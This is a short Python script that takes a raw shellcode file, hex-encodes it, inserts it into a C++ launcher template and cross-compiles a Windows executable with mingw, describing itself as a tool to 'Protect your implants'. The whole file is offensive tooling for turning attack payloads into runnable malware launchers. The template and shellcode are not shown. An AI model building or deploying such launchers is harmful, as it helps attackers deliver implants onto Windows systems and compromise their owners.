import binascii
import argparse
import subprocess
import os
def main(p_args):
    # Read source template
    with open("launcher_template.cpp", "r") as input_template:
        source_template = input_template.read()
    # Read input payload
    with open(p_args.input, "rb") as input_shellcode:
        raw_shellcode = input_shellcode.read()
    # Convert raw binary to formatted hex
    hex_data = binascii.hexlify(raw_shellcode).decode()
    hex_file_content = r"\x" + r"\x".join(hex_data[n : n+2] for n in range(0, len(hex_data), 2))
    # Insert the shellcode into the source code
    output_file = source_template.replace("#replace_me#", hex_file_content)
    # Write our formatted source file
    with open("compile_me.cpp", "w") as output_handle:
        output_handle.write(output_file)
    # Specify our compiler arguements
    compiler_args = []
    compiler_args.append("i686-w64-mingw32-c++")
    compiler_args.append("compile_me.cpp")
    compiler_args.append("-o")
    if len(p_args.output) > 0:
            compiler_args.append(p_args.output)
    else:
            compiler_args.append("shellcode_launcher.exe")
    # Compile the formatted source file
    subprocess.run(compiler_args)
    # Delete the formatted source file after it has been compiled
    os.remove("compile_me.cpp")
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Protect your implants')
    parser.add_argument("--input", help="Input file. Raw shellcode", type=str, required=True)
    parser.add_argument("--output", help="Specify file output", type=str, default="")
    args = parser.parse_args()
    main(args)